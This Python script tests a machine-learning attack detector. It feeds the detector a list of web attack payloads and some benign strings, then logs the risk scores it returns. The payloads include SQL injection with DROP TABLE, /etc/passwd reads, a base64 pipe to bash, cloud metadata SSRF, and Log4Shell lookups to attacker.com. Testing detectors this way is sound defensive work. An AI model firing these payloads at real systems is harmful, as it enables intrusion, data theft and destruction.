import sys
import json
import urllib.parse
from pathlib import Path

# Add backend to path so we can import app
sys.path.append(str(Path(__file__).parent.absolute()))

try:
    from app.ml.inference import ml_analyze
except ImportError as e:
    print(f"Error importing ml_analyze: {e}")
    sys.exit(1)

PAYLOADS = {
    "SQL Injection": {
        "Basic": "' OR '1'='1",
        "Blind Time-based": "' AND (SELECT SLEEP(5))--",
        "Union": "' UNION SELECT username, password FROM users--",
        "Boolean": "' AND 1=1--",
        "Stacked": "'; DROP TABLE users--"
    },
    "XSS": {
        "Basic": "<script>alert(1)</script>",
        "DOM": "\"><img src=x onerror=alert(document.cookie)>",
        "Obfuscated": "<scr<script>ipt>alert(1)</script>"
    },
    "Command Injection": {
        "Basic": "; cat /etc/passwd",
        "Pipe": "| whoami",
        "Base64 Exec": "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash"
    },
    "Path Traversal": {
        "Basic": "../../../etc/passwd",
        "Windows": "..\\..\\..\\windows\\system32\\cmd.exe",
        "Directory Traversal": "..%2f..%2f..%2fetc%2fpasswd"
    },
    "XXE": {
        "Basic": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
    },
    "SSRF": {
        "Basic": "http://169.254.169.254/latest/meta-data/",
        "Localhost": "http://127.0.0.1/admin"
    },
    "SSTI": {
        "Jinja2": "{{7*7}}",
        "EL": "${7*7}"
    },
    "Log4Shell": {
        "Basic": "${jndi:ldap://attacker.com/a}",
        "Obfuscated": "${${lower:j}ndi:ldap://attacker.com/a}"
    },
    "Payload Variations": {
        "URL Encoded SQLi": urllib.parse.quote("' OR '1'='1"),
        "Double URL Encoded SQLi": urllib.parse.quote(urllib.parse.quote("' OR '1'='1")),
        "Unicode SQLi": "\\u0027 OR \\u00271\\u0027=\\u00271",
        "Mixed (SQLi + XSS)": "' OR '1'='1; <script>alert(1)</script>"
    },
    "Legitimate (False Positives)": {
        "Login": "user123",
        "Search": "Apple iPhone 15 Pro Max",
        "Filename": "filename=report_2024.pdf",
        "URL": "https://google.com/search?q=test",
        "JSON": '{"username":"john", "role":"admin", "age": 30}',
        "XML": "<user><name>john</name><role>admin</role></user>"
    }
}

results = []

print("Running payload simulation...")
for category, payloads in PAYLOADS.items():
    print(f"\n--- {category} ---")
    for name, payload in payloads.items():
        try:
            # We want to test the model's raw text detection capabilities.
            decision = ml_analyze(payload, debug=True)
            res = {
                "category": category,
                "name": name,
                "payload": payload,
                "risk_score": decision.risk_score,
                "action": decision.action,
                "predicted_type": decision.attack_type,
            }
            results.append(res)
            print(f"[{name}] Action: {decision.action} | Type: {decision.attack_type} | Risk: {decision.risk_score:.2f}")
        except Exception as e:
            print(f"[{name}] ERROR: {e}")

with open("simulation_results.json", "w") as f:
    json.dump(results, f, indent=2)

print("\nSimulation complete. Results saved to simulation_results.json")
